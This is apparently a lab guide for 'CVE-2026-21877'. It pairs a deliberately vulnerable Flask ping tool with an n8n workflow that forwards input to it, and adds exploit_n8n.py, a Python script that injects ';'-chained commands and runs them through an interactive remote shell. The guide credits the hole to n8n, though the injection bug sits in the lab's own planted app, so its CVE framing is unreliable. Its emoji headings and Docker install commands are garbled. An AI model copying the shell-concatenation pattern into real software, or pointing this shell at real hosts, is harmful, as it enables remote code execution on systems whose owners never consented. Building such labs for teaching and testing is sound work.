# üß™ Lab Guide: CVE-2026-21877 Setup

This lab demonstrates the exploitation of a system orchestrated by n8n. The environment is configured to use a vulnerable version of n8n to showcase how security flaws in automation pipelines can lead to downstream Remote Code Execution (RCE).

## üöÄ Step 1: Setup Instructions

### üõ†Ô∏è Prerequisites: Install Docker and Docker Compose

If Docker is not installed on your system (Debian/Ubuntu), follow these steps to install the Docker Engine and the Compose plugin.

### 1. docker-compose.yml

```yaml
version: '3.8'

services:
  vulnerable-app:
    build: .
    container_name: vulnerable-app
    ports:
      - "5000:5000"
    networks:
      - lab-net

  n8n:
    image: n8nio/n8n:1.121.0
    container_name: n8n-lab
    ports:
      - "5678:5678"
    environment:
      - N8N_HOST=0.0.0.0
      - N8N_PORT=5678
      - N8N_PROTOCOL=http
      - WEBHOOK_URL=http://localhost:5678/
      - N8N_METRICS=true
      - N8N_DIAGNOSTICS_ENABLED=false
      - N8N_SECURE_COOKIE=false
      - N8N_COOKIES_SAMESITE=lax
    volumes:
      - n8n_data:/home/node/.n8n
    networks:
      - lab-net
    depends_on:
      - vulnerable-app

networks:
  lab-net:
    driver: bridge

volumes:
  n8n_data:
```

### 2. Dockerfile

```dockerfile
FROM python:3.9-slim
WORKDIR /app
RUN pip install flask
COPY target_server.py .
EXPOSE 5000
CMD ["python", "target_server.py"]

```

### 3. target_server.py

```python
from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<body>
    <h1>NetView Pro v4.2 - Diagnostic Tool</h1>
    <form method="POST">
        <input type="text" name="target" placeholder="IP Address" required>
        <button type="submit">Ping</button>
    </form>
    {% if result %}<pre>{{ result }}</pre>{% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    result = ""
    if request.method == 'POST':
        # Handles both Form Data and JSON for better lab compatibility
        target = request.form.get('target') or (request.json.get('target') if request.is_json else None)
        
        if not target:
            return "Error: No target provided", 400

        # VULNERABLE: Direct shell concatenation (CVE-2026-21877)
        command = f"ping -c 2 {target}"
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            result = output
        except Exception as e:
            # Captures output even on command failure (useful for RCE)
            result = str(getattr(e, 'output', str(e)))
            
    return render_template_string(HTML_TEMPLATE, result=result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```

### 4. n8n_workflow_cve.json

```json
{
  "nodes": [
    {
      "parameters": {
        "path": "diagnostic-gate",
        "responseMode": "lastNode",
        "options": {}
      },
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 1,
      "position": [250, 300]
    },
    {
      "parameters": {
        "method": "POST",
        "url": "http://vulnerable-app:5000/",
        "sendBody": true,
        "contentType": "form-urlencoded",
        "bodyParameters": {
          "parameters": [
            {
              "name": "target",
              "value": "={{ $json.body.address }}"
            }
          ]
        },
        "options": {}
      },
      "name": "HTTP Request",
      "type": "n8n-nodes-base.httpRequest",
      "typeVersion": 4.1,
      "position": [500, 300]
    }
  ],
  "connections": {
    "Webhook": {
      "main": [
        [
          {
            "node": "HTTP Request",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  }
}
```

### 5. exploit_n8n.py

```python
import requests
import sys

def attack(target_ip, cmd):
    """
    Sends the malicious payload to the n8n webhook-test endpoint.
    Requires the n8n workflow to be in 'Execute Workflow' mode.
    """
    url = f"http://{target_ip}:5678/webhook-test/diagnostic-gate"
    payload = {"address": f"127.0.0.1 ; {cmd}"}
    
    try:
        r = requests.post(url, json=payload, timeout=20)
        
        if r.status_code == 404:
            return "Error: 404 Not Found. Ensure 'Execute Workflow' is active in n8n UI."
        
        if "<pre>" in r.text:
            # Extract content between <pre> tags from the server's HTML response
            output = r.text.split("<pre>")[1].split("</pre>")[0]
            return output.strip()
        else:
            return f"Command executed, but no output returned.\nHTTP {r.status_code}\nSnippet: {r.text[:300]}"
            
    except Exception as e:
        return f"Connection Error: {str(e)}"

def interactive_shell(target_ip):
    print(f"--- Interactive Shell via CVE-2026-21877 ---")
    print(f"Target: {target_ip}")
    print("Type 'exit' to quit.\n")
    
    while True:
        try:
            cmd = input("rce_shell$ ")
            if cmd.lower() in ["exit", "quit"]: break
            if not cmd.strip(): continue
            print(attack(target_ip, cmd))
        except KeyboardInterrupt:
            print("\nExiting...")
            break

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python exploit_n8n.py <TARGET_IP>")
        print("Example: python exploit_n8n.py 34.182.47.137")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    interactive_shell(target_ip)

```

### Install Docker
```bash
sudo apt update
sudo apt install --yes apt-transport-https ca-certificates curl gnupg2 software-properties-common
curl -fsSL [https://download.docker.com/linux/debian/gpg](https://download.docker.com/linux/debian/gpg) | sudo apt-key add -
sudo add-apt-repository "deb [arch=amd64] [https://download.docker.com/linux/debian](https://download.docker.com/linux/debian) $(lsb_release -cs) stable"
sudo apt update
sudo apt install --yes docker-ce

```

#### 2. Install Docker Compose Plugin

```bash
sudo apt update
sudo apt install --yes docker-compose-plugin

```

#### 3. Initialize the Lab Containers

```bash
docker compose up -d

```
